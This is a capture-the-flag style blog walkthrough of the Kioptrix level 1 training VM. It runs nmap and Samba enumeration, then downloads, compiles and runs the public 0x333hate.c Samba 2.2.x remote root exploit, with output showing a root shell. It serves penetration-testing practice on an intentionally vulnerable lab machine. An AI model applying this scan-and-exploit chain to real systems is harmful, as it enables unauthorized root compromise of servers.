---
layout: post
title: "Kioptrix hacking challenge: Part 1"
date: 2012-07-04 18:10:26 -0400
comments: true
categories: boot2root
alias: /2012/07/kioptrix-hacking-challenge-part-1.html
---

Kioptrix is another set of virtual machines that are intended to be hacked into. As of this writing there are currently four Kioptrix challenges. Each one increases in difficulty and is a good start for someone new to penetration testing. Towards the end of last April, I started playing around with it and documented the steps to exploit it. Kioptrix 1 is geared towards the beginner, and is one of the easiest challenges out there.

<!--more-->

The Kioptrix virtual machines can be downloaded from [http://www.kioptrix.com/blog/?page_id=135](http://www.kioptrix.com/blog/?page_id=135)

I identified the IP address of the virtual machine using netdiscover and launched a port scan against it.

```
# nmap -sS -T4 -A 192.168.1.144
 
Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-23 20:26 EDT
Nmap scan report for 192.168.1.144
Host is up (0.00048s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE              VERSION
22/tcp   open  ssh                  OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp   open  http                 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind (rpcbind V2) 2 (rpc #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn          Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http             Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26 09:32:06
|_Not valid after:  2010-09-26 09:32:06
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_sslv2: server still supports SSLv2
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
1024/tcp open  status (status V1)   1 (rpc #100024)
MAC Address: 00:0C:29:46:F7:8C (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop
 
Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.1.144
```

nmap found a webserver, so I pointed my browser to http://192.168.1.144 and found an Apache test page. I fired up nikto and DirBuster in the background to scan the website for any vulnerabilities and hidden directories. In the meantime, I decided to look into the open Samba port.
nmap didn't print out the Samba version, so I decided to probe it a bit. I used nmblookup and smbclient

```
# nmblookup -A 192.168.1.144
Looking up status of 192.168.1.144
 KIOPTRIX        <00> -         B <ACTIVE> 
 KIOPTRIX        <03> -         B <ACTIVE> 
 KIOPTRIX        <20> -         B <ACTIVE> 
 ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
 MYGROUP         <00> - <GROUP> B <ACTIVE> 
 MYGROUP         <1d> -         B <ACTIVE> 
 MYGROUP         <1e> - <GROUP> B <ACTIVE> 
 
 MAC Address = 00-00-00-00-00-00
 
# smbclient -L //KIOPTRIX -I 192.168.1.144
Enter root's password: 
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
 
 Sharename       Type      Comment
 ---------       ----      -------
cli_rpc_pipe_open_noauth: rpc_pipe_bind for pipe \srvsvc failed with error ERRnosupport
 IPC$            IPC       IPC Service (Samba Server)
 ADMIN$          Disk      IPC Service (Samba Server)
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
 
 Server               Comment
 ---------            -------
 KIOPTRIX             Samba Server
 
 Workgroup            Master
 ---------            -------
 MYGROUP              KIOPTRIX
```

I was able to get a listing of the shares without a password. Using smbclient I identified that the server was running Samba 2.2.1a. I headed over to Google and searched for Samba 2.2.1 exploits. This revealed a SANS [paper](http://pen-testing.sans.org/resources/papers/gcih/0x333hatec-samba-remote-root-exploit-102967) about a Samba exploit called 0x333hate.c. A Google search for 0x333hate.c yielded a copy of the exploit, hosted at [SecurityFocus.com](http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c)

I downloaded the file and compiled it.

```
# wget http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c
--2012-04-23 22:34:02--  http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c
Resolving downloads.securityfocus.com... 143.127.139.111
Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6514 (6.4K) [text/plain]
Saving to: `0x333hate.c'
 
100%[=================================================================================================================>] 6,514       --.-K/s   in 0.1s    
 
2012-04-23 22:34:03 (62.5 KB/s) - `0x333hate.c' saved [6514/6514]
 
 
# gcc 0x333hate.c 
0x333hate.c: In function ‘usage’:
0x333hate.c:91: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c: In function ‘exploit’:
0x333hate.c:126: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:130: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:134: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:139: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:142: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c: In function ‘owned’:
0x333hate.c:201: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:210: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c:220: warning: incompatible implicit declaration of built-in function ‘exit’
0x333hate.c: In function ‘main’:
0x333hate.c:252: warning: format ‘%x’ expects type ‘unsigned int’, but argument 3 has type ‘long unsigned int’
```

Some warning messages, but no errors. I ran the exploit to see what would happen:

```
# ./a.out 
 
 [~] 0x333hate => samba 2.2.x remote root exploit [~]
 [~]        coded by c0wboy ~ www.0x333.org       [~]
 
 Usage : ./a.out [-t target] [-p port] [-h]
 
  -t target to attack
  -p samba port (default 139)
  -h display this help
```

Pretty simple, takes only one argument which is the IP address of the target. I tried it again and it gave me a root shell instantly:

```
# ./a.out -t 192.168.1.144
 
 [~] 0x333hate => samba 2.2.x remote root exploit [~]
 [~]        coded by c0wboy ~ www.0x333.org       [~]
 
 [-] connecting to 192.168.1.144:139
 [-] stating bruteforce
 
 [-] testing 0xbfffffff
 [-] testing 0xbffffdff
 [-] testing 0xbffffbff
 [-] testing 0xbffff9ff
 [-] testing 0xbffff7ff
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```

At this point the game was over. I explored the system a little bit and found a congratulatory message from the creator:

```
cat mbox
From root  Sat Sep 26 11:42:10 2009
Return-Path: <root@kioptix.level1>
Received: (from root@localhost)
 by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
 for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
Status: RO
 
If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...
```

This challenge was basically just a scan and exploit against a vulnerable target. Although that seems easy, that's exactly how a lot of servers are compromised. It's not too difficult to find servers running certain vulnerable services and exploits that target them. 

 
